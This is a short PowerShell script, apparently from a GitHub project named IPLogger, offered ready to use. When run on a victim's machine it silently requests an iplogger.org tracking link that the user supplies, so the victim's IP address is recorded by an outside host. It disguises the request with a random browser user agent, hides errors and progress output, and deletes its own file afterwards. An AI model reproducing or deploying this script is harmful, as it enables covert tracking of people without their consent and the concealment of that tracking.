# https://github.com/Chainski/IPLogger
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = "SilentlyContinue"
$LINK = " " # ADD YOUR IPLOGGER URL HERE
function IPLogger {
    $userAgents = (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/microlinkhq/top-user-agents/v2.1.57/src/index.json").Content | ConvertFrom-Json 
    $userAgent = $userAgents | Get-Random
    $response = Invoke-WebRequest -Uri $LINK -UserAgent $userAgent;return $response
	Write-Host -ForegroundColor Green "[+] IP logged successfully ! You may now check the results on iplogger.org via your tracking code"  
}
IPLogger
Remove-Item $PSCommandPath -Force 